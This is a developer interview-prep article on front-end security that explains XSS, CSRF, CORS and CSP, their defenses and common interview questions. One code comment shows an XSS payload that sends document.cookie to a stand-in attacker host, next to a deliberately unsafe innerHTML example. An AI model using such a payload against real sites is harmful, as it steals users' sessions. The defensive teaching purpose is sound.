---
title: "Front-end security: XSS, CSRF, CORS & CSP"
date: "2026-09-23"
category: "Sécurité"
level: "Intermédiaire"
summary: "XSS, CSRF, CORS, CSP: four acronyms every full-stack candidate must be able to tell apart in 30 seconds — plus the eternal \"where do I store the JWT?\" question, finally answered honestly."
---

## The essentials

The browser executes code downloaded from the Internet right next to your session data: it is a hostile environment by construction. Four mechanisms structure front-end security, and interviewers love checking that you don't mix them up:

- **XSS** (Cross-Site Scripting): the attacker gets **their JavaScript executed** in your page, in your users' browsers. They can then read the DOM, steal data, act on the user's behalf.
- **CSRF** (Cross-Site Request Forgery): the attacker gets the victim's browser to **send an authenticated request**, without executing any code on your site — exploiting the fact that cookies are sent automatically.
- **CORS**: not an attack, a **controlled relaxation** of the browser's same-origin policy, deciding which web pages may *read* your API's responses.
- **CSP** (Content Security Policy): a **declarative allowlist** of what the page may load and execute — the anti-XSS safety net.

| Attack | Mechanism | Main defense |
|---|---|---|
| Stored XSS | Payload persisted (comment in DB) then served to everyone | Contextual escaping on output + CSP |
| Reflected XSS | Payload in the URL, echoed back into the page | Escaping, validation + CSP |
| DOM XSS | Client-side JS injects untrusted data (`innerHTML`) | `textContent`, sanitization (DOMPurify) |
| CSRF | The browser attaches cookies automatically | Anti-CSRF token + `SameSite` cookie + `Origin` check |
| Clickjacking | Your site inside an invisible iframe | `frame-ancestors 'none'` (CSP) |

## How it works

**XSS**: any place where user-controlled data becomes HTML/JS is an entry point. Three variants: **stored** (the payload lives in the database and hits every visitor), **reflected** (the payload travels in the URL; the victim must be lured into clicking), **DOM-based** (the flaw is entirely client-side: `element.innerHTML = userInput`). The defense is **contextual escaping**: the same string is not escaped the same way in HTML, an attribute, JS, or a URL. Modern frameworks (React, Vue) escape by default — the flaws hide in the escape hatches: `dangerouslySetInnerHTML`, `v-html`, hand-built `href`s (`javascript:...`).

```js
// ❌ DANGEROUS: the user's HTML gets interpreted
div.innerHTML = comment;
// typical payload:
// <img src=x onerror="fetch('https://evil.tld/?c='+document.cookie)">

// ✅ Text stays text: the payload is displayed, not executed
div.textContent = comment;

// ✅ Need rich HTML (editor, markdown)? Sanitize:
import DOMPurify from "dompurify";
div.innerHTML = DOMPurify.sanitize(comment);
```

**CSRF**: the browser **automatically** attaches a site's cookies to any request headed to that site, even when triggered from another page. So it's enough to lure a logged-in victim to `evil.site`:

```text
victim ── active session on bank.com (cookie)
   │
   │ visits evil.site
   ▼
evil.site: hidden auto-submitted form
   │   POST https://bank.com/transfer
   ▼
the browser ATTACHES the session cookie
   ▼
bank.com: valid authenticated request…
          no protection → transfer executed
```

Combined defenses: an **anti-CSRF token** (random secret injected into the page and sent back with the request — `evil.site` cannot read it, thanks to the same-origin policy), a **`SameSite=Lax`** cookie (the modern browser default: the cookie no longer travels on cross-site requests, except top-level GET navigations) or `Strict`, and checking the `Origin` header server-side.

**CORS**: by default, the same-origin policy forbids JS on `site-a.com` from **reading** the response of a request to `api.site-b.com`. CORS lets the server explicitly **allow** origins (`Access-Control-Allow-Origin`). For "non-simple" requests (JSON, custom headers, `PUT`/`DELETE`), the browser first sends a **preflight** `OPTIONS` to ask permission.

**CSP**: a header declaring where the page may load scripts, styles and images from — and which, properly configured, blocks inline scripts. Even if an XSS payload gets through, it doesn't execute: it's defense in depth, not a replacement for escaping.

```text
Content-Security-Policy:
  default-src 'self';        # by default: my origin only
  script-src 'self';         # no inline scripts, no unlisted CDN
  img-src 'self' data:;      # local images + data URIs
  frame-ancestors 'none';    # nobody iframes me (clickjacking)
```

> ⚠️ **CORS does not protect your API** — CORS is enforced **by the browser, only**: `curl`, Postman or another server completely ignore those headers. CORS protects *users* (it prevents a malicious page from reading your responses with their cookies), not your server. API security is authentication and authorization. Corollary: `Access-Control-Allow-Origin: *` does not "open" your API to hackers — and restricting it does not secure it.

## Key concepts to master

- **Contextual escaping ≠ input validation**: validate on input (format, length), but escape **on output, according to the insertion context**. Escaping on input "once and for all" corrupts data and misses contexts.
- **`SameSite`**: `Strict` (the cookie never travels cross-site, even when clicking a link — surprising logouts), `Lax` (default: only on top-level GET navigations), `None` (always sent, requires `Secure`). `Lax` blocks classic POST CSRF — hence the rule: **never mutate state on GET**.
- **Preflight**: the automatic `OPTIONS` request before a non-simple request; the server replies with the allowed methods/headers/origins (`Access-Control-Allow-*`). If the preflight fails, the real request is never sent. That's the famous console "CORS error".
- **Token storage — the real trade-off**: in `localStorage`, the token is readable by any XSS → direct exfiltration. In an **`httpOnly` cookie**, JS cannot read it (XSS can no longer *steal* it)… but it travels automatically → you must handle CSRF (`SameSite` + token). General recommendation: `httpOnly` + `Secure` + `SameSite` cookie, with CSRF protections in place. And stay honest: XSS remains serious even with `httpOnly` — the attacker doesn't steal the token, but they make authenticated requests *from the page*.
- **Realistic CSP**: start from `default-src 'self'`, avoid `'unsafe-inline'` (which defeats the purpose), use nonces or hashes for legitimate inline scripts, and roll out with `Content-Security-Policy-Report-Only` first to measure breakage.

> 💡 **Frameworks escape, escape hatches kill** — React escapes everything that goes through JSX: `{userInput}` is safe. XSS flaws in React apps are almost always found in the same place: `dangerouslySetInnerHTML` without sanitization, or an `<a href={userInput}>` accepting `javascript:alert(1)`. The API's name warns you — listen to it.

## In an interview

**"Explain the difference between XSS and CSRF."** — XSS: the attacker **executes their code** in my page; they can read everything and do anything on the user's behalf; defense = contextual escaping + CSP. CSRF: the attacker **triggers an authenticated request** from another site, without executing code on mine, riding the automatically-sent cookies; defense = anti-CSRF token + `SameSite`. One injects code, the other rides the cookies.

**"Where do you store a JWT on the front end?"** — Give the trade-off, not a dogma: `localStorage` = vulnerable to exfiltration by XSS; `httpOnly` cookie = unreadable by JS but exposed to CSRF, covered by `SameSite` + a token. General preference: `httpOnly`/`Secure`/`SameSite` cookie. Bonus: short-lived tokens + refresh, and note that XSS remains serious in both cases.

**"What is CORS for? What's a preflight?"** — CORS relaxes the same-origin policy: the server declares which origins may read its responses from a browser. The preflight is the `OPTIONS` sent before non-simple requests to ask permission. Decisive bonus point: state that CORS does not protect the server — a non-browser client ignores it.

**"How do you prevent XSS in a React app?"** — Rely on JSX's default escaping, ban `dangerouslySetInnerHTML` (or always run it through DOMPurify), validate `href` URLs, and add a CSP without `'unsafe-inline'` as defense in depth.

**"What is SameSite?"** — A cookie attribute controlling whether it is sent in cross-site contexts: `Strict` (never), `Lax` (top-level GET navigations only — the default), `None` (always, with `Secure`). It's the browsers' native anti-CSRF defense, to be combined with a token for edge cases.

## Pitfalls & misconceptions

- **"CORS error → let's disable CORS / add a proxy"** — the error means *your server* doesn't allow your origin: the fix is one line of API config (`Access-Control-Allow-Origin`), not a workaround. The dev proxy is a local band-aid, not a fix.
- **"React/Vue protect me from XSS"** — by default yes, but `dangerouslySetInnerHTML`, `v-html` and `javascript:` URLs reintroduce the flaw in one line.
- **Sanitizing on input and calling it a day** — escaping depends on the *output* context; data safe in HTML can be dangerous in an attribute or a URL.
- **`SameSite=Lax` and GET mutations** — `Lax` lets top-level GET navigations through: a link `<a href="https://site.com/delete?id=1">` is still a working CSRF if your API mutates on GET.
- **A CSP with `'unsafe-inline'`** — that's a decorative CSP: XSS payloads are precisely inline scripts.

> 🎤 **In an interview** — practice delivering "XSS vs CSRF" in 30 seconds flat, with one defense each. It's THE discriminating front-end security question: those who mix the two up fail, and those who close with "and CORS is unrelated — it's a browser mechanism, not a server protection" score the points.

## Going further

- [OWASP — XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) and [CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN — CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) and [MDN — CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP): the readable references
- [PortSwigger Web Security Academy](https://portswigger.net/web-security): free XSS/CSRF/CORS labs — the best hands-on training
- [CSP Evaluator (Google)](https://csp-evaluator.withgoogle.com/): paste your CSP and see its holes
